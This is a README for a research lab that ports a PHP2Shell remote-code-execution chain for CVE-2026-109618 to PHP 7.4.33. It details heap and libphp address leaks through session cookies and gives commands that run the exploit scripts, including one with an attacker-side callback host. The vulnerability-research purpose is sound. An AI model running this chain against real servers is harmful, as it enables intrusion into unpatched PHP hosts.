# PHP2Shell on PHP 7.4.33: an HTTP-only `display_errors=Off` port

> **AI assistance disclosure:** This research package was developed with  
> assistance from OpenAI Codex for source review, experiment automation,  
> documentation and code generation.

This repository documents a version-specific port of the public PHP2Shell
research to the official `php:7.4.33-apache` image. It demonstrates
CVE-2026-109618 against Apache `mod_php` when the target application is only:

```php
<?php
echo 'hello world';
```

The final chain uses HTTP only. It does not read `/proc`, attach a debugger,
use the Docker API, depend on a target-side file disclosure, or require PHP
errors to be displayed.

This is not a new PHP vulnerability. The root cause is CVE-2026-109618. The
contribution here is the PHP 7.4.33 allocator-layout port and the completion of
the heap disclosure, libphp disclosure and bounded RCE chain with
`display_errors=Off`.

## Results

| Property | Result |
| --- | --- |
| PHP | 7.4.33 NTS |
| SAPI | Apache `mod_php`, prefork |
| Application requirement | Any reachable PHP page |
| `display_errors` | Off |
| Heap address source | HTTP `Set-Cookie` response |
| libphp address source | HTTP `Set-Cookie` response |
| Final proof | Attacker-side HTTP callback |
| ASLR page brute force | None |
| Remaining search | At most four known allocator layouts |

## Why the existing PHP 8.x layout did not work

The public PHP 8.4.26 research supplied the important high-level construction:
leave a stale session id during an OOM, reclaim the relevant allocator page,
and return memory through the session cookie. Copying that request layout to
PHP 7.4.33 did not produce a complete chain for four reasons.

1. **Different structure size and alignment.** PHP 7.4.33 uses a 56-byte
   `zend_array`. A real HashTable can begin only at `page + 56*k`. With the
   first producer, `PS(id)` landed at page offset zero, making the desired
   HashTable address `PS(id)-0x10 = previous_page+0xff0`. That offset is not
   divisible by 56, so the second leak was impossible with that placement.

2. **An additional stale `ps_files` allocation.** The original consumer order
   reached `ps_close_files()` and crashed before PHP emitted the cookie. A
   consumer that only reclaimed the stale id was therefore insufficient on
   this build.

3. **The first disclosure cannot simply be extended.** The 4,000-byte cookie
   reaches the end of the 2 MiB Zend MM chunk. Reading further does not walk
   into libphp; it reaches an unmapped or unrelated region.

4. **Small request changes move the OOM too early or too late.** Adding a new
   spray could exhaust memory before `PS(id)` was installed. Conversely, a
   later OOM could clear `send_cookie`, removing the disclosure channel.

## What changed in the port

The port uses a 39-byte first reclaimed string and a controlled number of
preceding live fields to place the stale id at offset `+0x80` in a 64-byte
allocation run. This satisfies the PHP 7.4 alignment constraint:

```text
(PS(id) offset - 0x10) mod 56 == 0
(0x80 - 0x10) mod 56 == 0
```

The second-stage producer then retains a suitable bin-64 slot, while the
consumer creates a real nine-entry HashTable at `PS(id)-0x10`. The overlapping
fields are interpreted as follows:

```text
PS(id)+0x10 = HT+0x20 = nTableSize | nInternalPointer
PS(id)+0x18 = HT+0x28 = nNextFreeElement
PS(id)+0x20 = HT+0x30 = pDestructor
```

For a normal PHP array, `pDestructor` is `zval_ptr_dtor`. In the pinned image,
subtracting its ELF-relative offset (`0x417d60`) yields the libphp base.

The final request uses the disclosed heap and libphp addresses. Failed final
attempts can leave the single Apache child in an allocator-dirty state, so the
runner deliberately rotates the disposable lab worker before trying the next
of four measured reclaim layouts. This is bounded allocator-layout selection,
not an ASLR address search.

## Reproduce

Requirements:

- Docker with Compose v2
- Python 3.9 or newer
- An x86-64 host capable of running the pinned image

Start the loopback-only lab:

```bash
docker compose up -d --build
```

If port 17433 is already occupied, select another loopback port consistently:

```bash
PHP2SHELL_PORT=17434 docker compose up -d --build
python remote_rce.py --port 17434
```

Run the disclosures independently:

```bash
python remote_heap_leak.py
docker compose restart php
python remote_libphp_leak.py
```

Restart to obtain a clean allocator and run the combined proof:

```bash
docker compose restart php
python remote_rce.py
```

Docker Desktop commonly exposes the host to the container at
`192.168.65.254`. On a different setup, supply a callback address reachable
from the container:

```bash
python remote_rce.py --callback-host HOST_ADDRESS --callback-port 8000
```

The callback command must fit the PoC's 27-byte carrier. Generated JSON
receipts are written under `evidence/` and are ignored by Git.

## Files

- `remote_heap_leak.py` — 4,000-byte stale-id cookie disclosure and Zend MM
  chunk-base recovery.
- `remote_libphp_leak.py` — aligned real-HashTable overlap and libphp-base
  recovery.
- `remote_rce.py` — combined disclosure and bounded final proof.
- `probe_reclaim.py` — low-level final request constructor.
- `compose.yaml`, `Dockerfile`, `php.ini`, `mpm_prefork.conf` — pinned,
  loopback-only lab.
- `html/index.php` — minimal target application.

## Scope and limitations

This is a pinned research reproduction, not a universal scanner or exploit.
The constants depend on the exact PHP image, architecture, Apache prefork
configuration, one-worker layout, OPcache warm-up and 8 MiB PHP memory limit.
Changing any of these can require recalibration.

The lab intentionally crashes disposable workers. Do not point these scripts
at systems you do not own or lack explicit authorization to test.

PHP 7.4 is end-of-life. Upgrade to a supported PHP release or use a vendor/LTS
package containing the CVE-2026-109618 and CVE-2026-109619 backports.

## Prior work and vulnerability references

- PHP advisory for CVE-2026-109618:
  <https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w>
- Public PHP 8.4.26 ASLR-bypass research used as the starting point:
  <https://github.com/9bie/php2shell-bypass-aslr-exp>

Please preserve these references when redistributing this port.
